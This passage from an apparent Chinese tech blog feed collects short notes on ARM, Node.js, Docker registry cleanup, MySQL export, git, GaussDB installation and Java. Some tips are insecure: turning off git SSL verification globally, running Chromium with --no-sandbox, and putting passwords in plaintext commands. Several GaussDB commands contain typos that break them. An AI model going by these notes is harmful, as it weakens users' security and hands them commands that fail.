        <content type="html"><![CDATA[<p>AArch64是ARMv8 架构的一种执行状态。</p><p>为了更广泛地向企业领域推进，需要引入 64 位构架。同时也需要在 ARMv8 架构中引入新的 AArch64 执行状态。AArch64 不是一个单纯的 32 位 ARM 构架扩展，而是 ARMv8 内全新的构架，完全使用全新的 A64 指令集。这些都源自于多年对现代构架设计的深入研究。更重要的是， AArch64 作为一个分离出的执行状态，意味着一些未来的处理器可能不支持旧的 AArch32 执行状态。 虽然最初的 64 位 ARM 处理器将会完全向后兼容，但我们大胆且前瞻性地将 AArch64 作为在 ARMv8 处理器中唯一的执行状态。我们在这些系统中将不支持 32 位执行状态， 这将使许多有益的实现得到权衡，如默认情况下，使用一个较大的 64K 大小的页面，并会使得纯净的 64 位 ARM 服务器系统不受遗留代码的影响。立即进行这种划分是很重要的，因为有可能在未来几年内将出现仅支持 64 位的服务器系统。没有必要在新的 64 位架构中去实现一个完整的 32 位流水线，这将会提高未来 ARM 服务器系统的能效。这样回想起来， AArch64 作为在 Fedora ARM 项目中被支持的 ARM 构架是一个很自然的过程： armv5tel、armv7hl、aarch64。新的架构被命名为：aarch64，这同 ARM 自己选择的主线命名方式保持一致，同时也考虑到了 ARM 架构名与 ARM 商标分开的期望。</p>]]></content>
      
      
      <categories>
          
          <category> ARM </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>EulerOS 安装 Nodejs（ARM版本）</title>
      <link href="/ARM/arm/install-nodejs-on-arm/"/>
      <url>/ARM/arm/install-nodejs-on-arm/</url>
      
        <content type="html"><![CDATA[<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ol><li>通过Linux系统命令【uname -a】 查看操作系统位数（备注：x86_64表示X86处理器64位系统， aarch64表示ARM处理器64位系统）</li><li>去官网下载ARMv8版本的压缩包（Jetson TX1的处理器是ARM57，基于ARMv8的核）<br>英文网址：<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a></li><li>下载解压后建立软连接 </li></ol><blockquote><p>ln -s ~/program/nodejs/bin/npm /usr/local/bin/<br>ln -s ~/program/nodejs/bin/node /usr/local/bin/</p></blockquote><p>检查是否有效</p><blockquote><p>node -v</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ARM </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>网页快照方案 puppeteer</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/puppeteer/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/puppeteer/</url>
      
        <content type="html"><![CDATA[<pre><code>const puppeteer = require(&#39;puppeteer&#39;);(async() =&gt; {    const browser = await puppeteer.launch({        executablePath:&#39;/usr/bin/chromium-browser&#39;,        args: [            &#39;--no-sandbox&#39;,            &#39;--disable-setuid-sandbox&#39;        ]    });    const page = await browser.newPage();    await page.goto(&#39;https://www.google.com/&#39;, {waitUntil: &#39;networkidle2&#39;});    browser.close();})();</code></pre><h2 id="使用容器启动"><a href="#使用容器启动" class="headerlink" title="使用容器启动"></a>使用容器启动</h2><ul><li><a href="https://hub.docker.com/r/supernisor/armv7-puppeteer" target="_blank" rel="noopener">https://hub.docker.com/r/supernisor/armv7-puppeteer</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker 部署机器上镜像清理</title>
      <link href="/docker/docker/docker-clean/"/>
      <url>/docker/docker/docker-clean/</url>
      
        <content type="html"><![CDATA[<blockquote><p>docker rmi $(docker images –filter “dangling=true” -q) &amp;</p></blockquote><p>添加到脚本</p><blockquote><p>vim /root/crontab/images_clean.sh</p></blockquote><p>写入 crontab</p><pre><code>0 0 * * * /root/crontab/images_clean.sh 1&gt;/dev/null 2&gt;&amp;1 &amp;</code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker 自带镜像仓库清理</title>
      <link href="/docker/docker/docker-registry-clean/"/>
      <url>/docker/docker/docker-registry-clean/</url>
      
        <content type="html"><![CDATA[<p>Docker存储使用的aufs文件系统分层存储结构,将容器文件以读写分层的形式存储在宿主机中。自带的镜像仓库删除比较麻烦，需要调用 API 删除，然后进入容器执行。</p><h2 id="手动删除"><a href="#手动删除" class="headerlink" title="手动删除"></a>手动删除</h2><p>进入 registry 容器</p><blockquote><p>vim /etc/docker/registry/config.yml</p></blockquote><p>添加配置</p><pre><code>storage:  delete:    enabled: true</code></pre><p>重启 registry</p><p>调用 API 获取所有镜像仓库 </p><blockquote><p>curl <a href="http://host:5000/v2/_catalog" target="_blank" rel="noopener">http://host:5000/v2/_catalog</a></p></blockquote><p>获取仓库标签</p><blockquote><p>curl <a href="http://host:5000/v2/app-frontend/tags/list" target="_blank" rel="noopener">http://host:5000/v2/app-frontend/tags/list</a></p></blockquote><p>获取标签对应的digest</p><blockquote><p>curl <a href="http://host:5000/v2/app-frontend/manifests/v1" target="_blank" rel="noopener">http://host:5000/v2/app-frontend/manifests/v1</a></p></blockquote><p>注意： 必须配置 Header Accept: application/vnd.docker.distribution.manifest.v2+json，否则获取的值不对</p><p>注意看前面操作返回值的 Header，使用 Docker-Content-Digest 的完整值，包含 sha256: 前缀。</p><p>删除 manifest </p><blockquote><p>curl <a href="http://host:5000/v2/app-frontend/manifests/sha256:1234455" target="_blank" rel="noopener">http://host:5000/v2/app-frontend/manifests/sha256:1234455</a> -X DELETE</p></blockquote><p>调用API清理后，进入容器，清理磁盘空间</p><p>清理空间</p><blockquote><p>registry garbage-collect /etc/docker/registry/config.yml</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><p>参考 API <a href="https://docs.docker.com/registry/spec/api" target="_blank" rel="noopener">https://docs.docker.com/registry/spec/api</a><br>单个清理过程 <a href="https://blog.csdn.net/isea533/article/details/87622213" target="_blank" rel="noopener">https://blog.csdn.net/isea533/article/details/87622213</a><br>批量清理 <a href="https://blog.csdn.net/ywq935/article/details/83828888" target="_blank" rel="noopener">https://blog.csdn.net/ywq935/article/details/83828888</a></p></blockquote><h2 id="网友编写的自动调API的-python2-7-脚本"><a href="#网友编写的自动调API的-python2-7-脚本" class="headerlink" title="网友编写的自动调API的 python2.7 脚本"></a>网友编写的自动调API的 python2.7 脚本</h2><pre><code>import requestsfrom concurrent.futures import ThreadPoolExecutorclass Docker(object):    def __init__(self, hub, repos):        self.hub = hub        self.repos = repos    @staticmethod    def get_tag_list(hub, repo):        # 获取这个repo的所有tags        tag_list_url = &#39;%s/v2/%s/tags/list&#39; % (hub, repo)        r1 = requests.get(url=tag_list_url)        tag_list = r1.json().get(&#39;tags&#39;)        return tag_list    def main(self):        thpool = ThreadPoolExecutor(10)        for repo in self.repos:            thpool.submit(self.delete_images, repo)        thpool.shutdown(wait=True)    def delete_images(self, repo):        hub = self.hub        tag_list = self.get_tag_list(hub=hub, repo=repo)        num = 0        try:            # 保留最后两个版本的镜像            for tag in tag_list[:-2]:                # 获取image digest摘要信息                get_info_url = &#39;{}/v2/{}/manifests/{}&#39;.format(hub, repo, tag)                header = {&quot;Accept&quot;: &quot;application/vnd.docker.distribution.manifest.v2+json&quot;}                r2 = requests.get(url=get_info_url, headers=header, timeout=10)                digest = r2.headers.get(&#39;Docker-Content-Digest&#39;)                # 删除镜像                delete_url = &#39;%s/v2/%s/manifests/%s&#39; % (hub, repo, digest)                r3 = requests.delete(url=delete_url)                if r3.status_code == 202:                    num += 1        except Exception as e:            print(str(e))        print(&#39;仓库%s 共删除了%i个历史镜像&#39; % (repo, num))if __name__ == &#39;__main__&#39;:    hub = &#39;http://registry.xxx.com:5000&#39;    repos = [&#39;zdtest&#39;, &#39;ordertest&#39;, &#39;bjdev&#39;, &#39;zhqtest&#39;, &#39;systemtest&#39;, &#39;zddev&#39;, &#39;bjtest&#39;, &#39;dsystemtest&#39;, &#39;tooltest&#39;]    d = Docker(hub=hub, repos=repos)    d.main()————————————————版权声明：本文为CSDN博主「ywq935」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。原文链接：https://blog.csdn.net/ywq935/article/details/83828888</code></pre>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 查看域名后所有的IP</title>
      <link href="/linux/linux/linux-dig/"/>
      <url>/linux/linux/linux-dig/</url>
      
        <content type="html"><![CDATA[<blockquote><p>dig <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p></blockquote><p>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a><br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 27655<br>;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1</p><p>;; OPT PSEUDOSECTION:<br>; EDNS: version: 0, flags:; udp: 4096<br>;; QUESTION SECTION:<br>;<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>.            IN    A</p><p>;; ANSWER SECTION:<br><a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>.        198    IN    CNAME    <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.<br><a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.    371    IN    A    61.135.169.125<br><a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a>.    371    IN    A    61.135.169.121</p><p>;; Query time: 48 msec<br>;; SERVER: 10.202.4.4#53(10.202.4.4)<br>;; WHEN: Wed Jan 15 16:50:48 CST 2020<br>;; MSG SIZE  rcvd: 101</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>mysql 数据导出</title>
      <link href="/mysql/mysql/mysqldump/"/>
      <url>/mysql/mysql/mysqldump/</url>
      
        <content type="html"><![CDATA[<h2 id="数据库导出"><a href="#数据库导出" class="headerlink" title="数据库导出"></a>数据库导出</h2><blockquote><p>mysqldump \<br>–column-statistics=0 \<br>–user=root \<br>–password=123456 \<br>–compatible=postgresql \<br>databasename</p></blockquote><p>PS 我用的 Mac Mysql workbench 带的 mysqldump 命令</p><blockquote><p>/Applications/MySQLWorkbench.app/Contents/MacOS/mysqldump \<br>–column-statistics=0 \<br>–user=root \<br>–password=123456 \<br>–compatible=postgresql \</p></blockquote><h2 id="查询结果导出"><a href="#查询结果导出" class="headerlink" title="查询结果导出"></a>查询结果导出</h2><pre><code>mysql&gt; SELECT * FROM runoob_tbl     -&gt; INTO OUTFILE &#39;/tmp/runoob.txt&#39;;</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>mysqldump 文档 <a href="https://dev.mysql.com/doc/refman/5.6/en/mysqldump.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.6/en/mysqldump.html</a> </li><li>select 到文件方法 <a href="https://www.runoob.com/mysql/mysql-database-export.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-database-export.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>统计代码行数</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/count-code-lines/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/count-code-lines/</url>
      
        <content type="html"><![CDATA[<p>可以使用 idea 的插件：Statistic</p>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python 监听指定端口</title>
      <link href="/python/python/python-listen-port/"/>
      <url>/python/python/python-listen-port/</url>
      
        <content type="html"><![CDATA[<blockquote><p>python -m SimpleHTTPServer 2376</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Git 提交文件属性</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/git-commit-filemode/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/git-commit-filemode/</url>
      
        <content type="html"><![CDATA[<p>默认git提交的文件没有属性，例如执行权限</p><p>可以使用下面的命令</p><blockquote><p>git update-index –chmod=+x script.sh</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 文件和目录操作</title>
      <link href="/linux/linux/linux-file-and-path/"/>
      <url>/linux/linux/linux-file-and-path/</url>
      
        <content type="html"><![CDATA[<h2 id="几个特殊的相对目录"><a href="#几个特殊的相对目录" class="headerlink" title="几个特殊的相对目录"></a>几个特殊的相对目录</h2><ul><li>. 当前目录</li><li>.. 上一个目录</li><li>~ 家目录</li><li>~account 另外一个用户的家目录</li><li><code>-</code> 上一次的目录 </li></ul><h2 id="对目录的几个常见操作"><a href="#对目录的几个常见操作" class="headerlink" title="对目录的几个常见操作"></a>对目录的几个常见操作</h2><p>递归创建目录</p><blockquote><p>mkdir -p 目录名称</p></blockquote><p>递归删除目录</p><blockquote><p>rm -rf 目录名称</p></blockquote><h2 id="ls-的几个技巧"><a href="#ls-的几个技巧" class="headerlink" title="ls 的几个技巧"></a>ls 的几个技巧</h2><p>排序查看</p><blockquote><p>ls -S </p></blockquote><p>查看包含隐藏文件，以及详细信息</p><blockquote><p>ls -al </p></blockquote><p>格式化文件大小显示</p><blockquote><p>ls -h</p></blockquote><h2 id="cp-rm-mv-注意事项"><a href="#cp-rm-mv-注意事项" class="headerlink" title="cp rm mv 注意事项"></a>cp rm mv 注意事项</h2><p>复制文件全部属性，包括权限，否则会当做当前用户处理</p><blockquote><p>cp -a </p></blockquote><p>创建符号链接</p><blockquote><p>cp -s</p></blockquote><p>创建硬链接</p><blockquote><p>cp -l </p></blockquote><p>如果文件中有特殊字符，无法直接删除，可以使用 <code>./xxx</code> 的方式删除</p><blockquote><p>rm ./–xx.txt</p></blockquote><h2 id="获取路径的文件名和目录名称"><a href="#获取路径的文件名和目录名称" class="headerlink" title="获取路径的文件名和目录名称"></a>获取路径的文件名和目录名称</h2><p>获取文件名 network </p><blockquote><p>basename /etc/sysconfig/network</p></blockquote><p>获取目录 /etc/sysconfig</p><blockquote><p>dirname /etc/sysconfig/network</p></blockquote><h2 id="文本文件查看"><a href="#文本文件查看" class="headerlink" title="文本文件查看"></a>文本文件查看</h2><ul><li>cat 从第一行开始显示</li><li>tac 从最后一行开始显示</li><li>nl 输出并显示行号</li><li>more 分页显示文件内容</li><li>less 往前翻页</li><li>head 看前面几行</li><li>tail 看后面几行</li><li>od 使用二进制的方式读取</li></ul><p>文本查看时几个比较方便的命令</p><ul><li>空格：向下翻动一页</li><li>/ 向下查找</li><li>? 向上查找</li><li>n 重复前一个查找</li><li>N 反向上一个查找</li><li>g 前进到数据的第一行</li><li>G 前进到数据的最后一行</li><li>q 离开</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Maven 将本地 jar 打包到项目</title>
      <link href="/java/devops/maven-import-local-jar/"/>
      <url>/java/devops/maven-import-local-jar/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-install-到本地仓库的方案"><a href="#使用-install-到本地仓库的方案" class="headerlink" title="使用 install 到本地仓库的方案"></a>使用 install 到本地仓库的方案</h2><p>使用 mvn install 到本地，如果使用 CI 可以先于 mvn package 执行。</p><pre><code>mvn install:install-file \   -Dfile=&lt;path-to-file&gt; \   -DgroupId=&lt;group-id&gt; \   -DartifactId=&lt;artifact-id&gt; \   -Dversion=&lt;version&gt; \   -Dpackaging=&lt;packaging&gt; \   -DgeneratePom=true</code></pre><p>然后按照正常的方式引入依赖即可。</p><h2 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h2><p>systemPath 方式导入，但是这种方式，测试和本地运行可以，服务器运行会报找不到 class 的错误。</p><pre><code>&lt;dependency&gt;    &lt;groupId&gt;com.sample&lt;/groupId&gt;    &lt;artifactId&gt;sample&lt;/artifactId&gt;    &lt;version&gt;1.0&lt;/version&gt;    &lt;scope&gt;system&lt;/scope&gt;    &lt;systemPath&gt;${project.basedir}/src/main/resources/Name_Your_JAR.jar&lt;/systemPath&gt;&lt;/dependency&gt;</code></pre><p>这种方式需要将jar 包通过 resources 引入,现在使用maven 打包，虽然添加到仓库里了，但是打包后到boot-info lib里是找不到的。</p><pre><code>&lt;resources&gt;            &lt;resource&gt;                &lt;directory&gt;lib&lt;/directory&gt;                &lt;targetPath&gt;BOOT-INF/lib/&lt;/targetPath&gt;                &lt;includes&gt;                    &lt;include&gt;**/*.jar&lt;/include&gt;                &lt;/includes&gt;            &lt;/resource&gt;        &lt;/resources&gt;</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/guogenfang/article/details/53734826" target="_blank" rel="noopener">https://blog.csdn.net/guogenfang/article/details/53734826</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 项目密匙安全</title>
      <link href="/Spring/spring/springboot-credential/"/>
      <url>/Spring/spring/springboot-credential/</url>
      
        <content type="html"><![CDATA[<h2 id="使用-Jenkis-的密匙管理"><a href="#使用-Jenkis-的密匙管理" class="headerlink" title="使用 Jenkis 的密匙管理"></a>使用 Jenkis 的密匙管理</h2><h2 id="使用分布式的密匙管理"><a href="#使用分布式的密匙管理" class="headerlink" title="使用分布式的密匙管理"></a>使用分布式的密匙管理</h2><h2 id="使用-ENC-对密码进行加密"><a href="#使用-ENC-对密码进行加密" class="headerlink" title="使用 ENC 对密码进行加密"></a>使用 ENC 对密码进行加密</h2><p>可以使用 jasypt 库对 yml 中的密码进行加密</p><p>参考地址 <a href="https://yq.aliyun.com/articles/182720?utm_content=m_29522" target="_blank" rel="noopener">https://yq.aliyun.com/articles/182720?utm_content=m_29522</a></p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 使用 alternatives 切换Java版本</title>
      <link href="/linux/linux/jdk-version/"/>
      <url>/linux/linux/jdk-version/</url>
      
        <content type="html"><![CDATA[<p>lternatives与update-alternatives好像是同一样工具（各个linux发行版使用的不一样）</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>如果 linux 机器上安装了多个 java 版本，需要切换。可以使用 alternatives。</p><p>原来是在/usr/bin目录下创建一个符号链接，指向/etc/alternatives/ 下的的文件，而该文件依然是一个符号链接。</p><pre><code>[root@node1 mec]# ll /usr/bin/java  lrwxrwxrwx. 1 root root 22 4月  16 16:06 /usr/bin/java -&gt; /etc/alternatives/java  </code></pre><h2 id="切换-java-版本"><a href="#切换-java-版本" class="headerlink" title="切换 java 版本"></a>切换 java 版本</h2><blockquote><p>alternatives –config java  </p></blockquote><pre><code>共有 3 个程序提供“java”。    选择    命令  -----------------------------------------------     1           /usr/lib/jvm/jre-1.5.0-gcj/bin/java  *  2           /usr/lib/jvm/jre-1.7.0-openjdk.x86_64/bin/java   + 3           /usr/java/default/bin/java  </code></pre><p>然后选择你想要选择的选项保存就好了</p><h2 id="添加的新的-java-版本到-alternatives-管理"><a href="#添加的新的-java-版本到-alternatives-管理" class="headerlink" title="添加的新的 java 版本到 alternatives 管理"></a>添加的新的 java 版本到 alternatives 管理</h2><blockquote><p>alternatives –install /usr/bin/java java /usr/lib/jdk1.8/bin/java 500  </p></blockquote><p>参数说明：</p><ul><li>/usr/bin/java java path 逻辑,会被 alternatives 软连接</li><li>java java 命令</li><li>/usr/lib/jdk1.8/bin/java 新的 java 版本目标地址</li><li>500 选择的时候的序号</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/ccfxue/article/details/53822740" target="_blank" rel="noopener">https://blog.csdn.net/ccfxue/article/details/53822740</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>忽略 git SSL 证书</title>
      <link href="/git/git/ignore-ssh-certificate/"/>
      <url>/git/git/ignore-ssh-certificate/</url>
      
        <content type="html"><![CDATA[<p>如果自己搭建的 gitlab 开启了自签名证书的 ssl，客户端拉取代码时候会报错</p><pre><code>error: SSL certificate problem, verify that the CA cert is OK. Details:error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed while accessing https://github.com/username/ExcelANT.git/info/refs</code></pre><p>全局关闭 ssl 验证</p><blockquote><p>git config –global http.sslVerify false</p></blockquote><p>当前仓库关闭 ssl 验证</p><blockquote><p>git config http.sslVerify false</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewall" target="_blank" rel="noopener">https://stackoverflow.com/questions/3777075/ssl-certificate-rejected-trying-to-access-github-over-https-behind-firewall</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> git </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>docker 容器导入导出</title>
      <link href="/docker/docker/docker-export/"/>
      <url>/docker/docker/docker-export/</url>
      
        <content type="html"><![CDATA[<p>涉及的命令有export、import、save、load</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>export命令是从容器（container）中导出tar文件，而save命令则是从镜像（images）中导出。</p><p>export命令导出的tar文件略小于save命令导出的。</p><p>export导出的文件再import回去时，无法保留镜像所有历史（即每一层layer信息，不熟悉的可以去看Dockerfile），不能进行回滚操作；而save是依据镜像来的，所以导入时可以完整保留下每一层layer信息。如下图所示，nginx:latest是save导出load导入的，nginx:imp是export导出import导入的。</p><ul><li>若是只想备份images，使用save、load即可</li><li>若是在启动容器后，容器内容有变化，需要备份，则使用export、import</li><li>需要注意这两对命令不能交错使用，否则无法启动容器</li></ul><h2 id="save-load"><a href="#save-load" class="headerlink" title="save load"></a>save load</h2><p>导出</p><blockquote><p>docker save [options] images [images…]</p></blockquote><p>例如 </p><blockquote><p>docker save -o nginx.tar nginx:latest</p></blockquote><p>导入 </p><blockquote><p>docker load [options]</p></blockquote><p>例如</p><blockquote><p>docker load -i nginx.tar</p></blockquote><h2 id="export-import"><a href="#export-import" class="headerlink" title="export  import"></a>export  import</h2><p>导出</p><blockquote><p>docker export [options] container</p></blockquote><p>其中-o表示输出到文件，nginx-test.tar为目标文件，nginx-test是源容器名（name）</p><p>例如</p><blockquote><p>docker export -o nginx-test.tar nginx-test</p></blockquote><p>导入</p><blockquote><p>docker import [options] file|URL|- [REPOSITORY[:TAG]]</p></blockquote><p> 例如</p><blockquote><p>docker import nginx-test.tar nginx:imp</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/ncdx111/article/details/79878098" target="_blank" rel="noopener">https://blog.csdn.net/ncdx111/article/details/79878098</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>linux 磁盘管理</title>
      <link href="/linux/linux/linux-disk/"/>
      <url>/linux/linux/linux-disk/</url>
      
        <content type="html"><![CDATA[<h2 id="fdisk-命令"><a href="#fdisk-命令" class="headerlink" title="fdisk 命令"></a>fdisk 命令</h2><p>查看硬盘</p><blockquote><p>fdisk -l </p></blockquote><p>查看磁盘的使用情况命令</p><blockquote><p>df -h</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>GaussDB 安装教程</title>
      <link href="/mysql/mysql/gauss%20db/"/>
      <url>/mysql/mysql/gauss%20db/</url>
      
        <content type="html"><![CDATA[<p>pvcreate /dev/vdb<br>vgcreate mate /dev/vdb</p><p>lvcreate -n gaussdb -L 150G mate<br>mkdir /GDEMate<br>mkfs.xfx /dev/mate/gaussdb<br>mount /dev/mate/gaussdb /GDEMate</p><p>echo “mount /dev/mate/gaussdb /GDEMate” &gt;&gt; /etc/rc.lcoal</p><p>规划目录</p><p>groupadd dbgrp<br>useradd -g dbgrp -d /GDEMate/gaussdba -m -s /bin/bash gaussdba</p><p>echo “GDEMate#321” | passwod –stdin gaussdba</p><p>mkdir /GdeMate/gaussdba/data<br>chown -R gaussdba:dbgrp /GDEMate/gaussdba</p><p>chmod -R 0750 /GDEMate/gaussdba<br>chmod -R 0700 /GDEMate/gaussdba/data</p><p>安装</p><p>mkdir -p  /opt/software/guassdb</p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 正则</title>
      <link href="/java/java/java-regrex/"/>
      <url>/java/java/java-regrex/</url>
      
        <content type="html"><![CDATA[<h2 id="提取字符串中的字符"><a href="#提取字符串中的字符" class="headerlink" title="提取字符串中的字符"></a>提取字符串中的字符</h2><p>提取字符串中的数字</p><pre><code>public static void main(String[]args) {    Pattern p = Pattern.compile(&quot;\\d+&quot;);    Matcher m = p.matcher(&quot;string1234more567string890&quot;);    while(m.find()) {        System.out.println(m.group());    }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.testingexcellence.com/extract-numbers-string-java-regular-expressions/" target="_blank" rel="noopener">https://www.testingexcellence.com/extract-numbers-string-java-regular-expressions/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 各种流总结</title>
      <link href="/java/java/java-io/"/>
      <url>/java/java/java-io/</url>
      
        <content type="html"><![CDATA[<h2 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h2><p>字节流与字符无关，可以处理所有的资源类型。</p><p>两个抽象类</p><ul><li>InputStream</li><li>OutputStream</li></ul><p>JDK 提供常用的类有</p><ul><li>FileInputStream</li><li>FileOutputSteam</li></ul><h2 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h2><p>字符流需要考虑编码，只能处理文本文件。字节流变成字符流需要解码，字符流编程字节流需要编码。</p><p>两个抽象类</p><ul><li>Reader</li><li>Writer </li></ul><p>可用的类</p><ul><li>FileReader</li><li>FileWriter</li></ul><h2 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h2><p>缓冲流依赖字符流,拥有缓冲区机制，可以提高性能。</p><ul><li>BufferedReader</li><li>BufferedWriter</li></ul><h2 id="节点流"><a href="#节点流" class="headerlink" title="节点流"></a>节点流</h2><p>从字节数组中创建流，使用后无需关闭。当文件不大时，可以直接读取到字节数组。</p><ul><li>ByteArrayInputSteam</li><li>ByteArrayOutputSteam</li></ul><h2 id="处理流"><a href="#处理流" class="headerlink" title="处理流"></a>处理流</h2><p>处理流在输出数据时，可以输出数据类型，只能是基本类型和字符串。处理流，用的比较少。</p><ul><li>DataInputSteam </li><li>DataOuputSteam</li></ul><h2 id="序列化处理流"><a href="#序列化处理流" class="headerlink" title="序列化处理流"></a>序列化处理流</h2><p>用于序列化和序列化，可以将对象类型输出到文件。</p><ul><li>ObjectInputStream</li><li>ObjectOutputStream</li></ul><p>使用 Java 自带的序列化机制，被序列化对象需要增加 Seriablizable 接口。<br>如果不需要序列化的字段使用 transient 标注。</p><h2 id="打印流"><a href="#打印流" class="headerlink" title="打印流"></a>打印流</h2><p>用于控制台打印输出，常见用处是将控制台的输出打印到文件中，日志框架一般通过这种方式，作为日志输出。</p><ul><li>PrintStream</li></ul><pre><code>System.setOut(new PrintStream(new FileOutputSteam(&quot;./test.log&quot;)，true)</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 内存回收机制</title>
      <link href="/java/java/java-gc/"/>
      <url>/java/java/java-gc/</url>
      
        <content type="html"><![CDATA[<h2 id="java-8-基本机制"><a href="#java-8-基本机制" class="headerlink" title="java 8 基本机制"></a>java 8 基本机制</h2><p>GC 帮助回收内存的两个任务：</p><ul><li>发现无用的对象</li><li>回收无用的对象占用的内存空间</li></ul><p>垃圾回收算法</p><ul><li>引用计数法</li><li>引用可达，通过图收集引用信息</li></ul><h2 id="通用的分代垃圾回收机制"><a href="#通用的分代垃圾回收机制" class="headerlink" title="通用的分代垃圾回收机制"></a>通用的分代垃圾回收机制</h2><p>分代垃圾回收机制，是基于这样一个事实：不同的对象的生命周期是不一样的。因此，不同生命周期的对象可以采取不同的回收算法，以便提高回收效率。我们将对象分为三种状态：年轻代、年老代、持久代。JVM将堆内存划分为 Eden、Survivor 和 Tenured/Old 空间。</p><h3 id="三种分代内存模型"><a href="#三种分代内存模型" class="headerlink" title="三种分代内存模型"></a>三种分代内存模型</h3><ol><li>年轻代</li></ol><p>　　所有新生成的对象首先都是放在Eden区。 年轻代的目标就是尽可能快速的收集掉那些生命周期短的对象，对应的是Minor GC，每次 Minor GC 会清理年轻代的内存，算法采用效率较高的复制算法，频繁的操作，但是会浪费内存空间。当“年轻代”区域存放满对象后，就将对象存放到年老代区域。</p><ol start="2"><li>年老代</li></ol><p>　　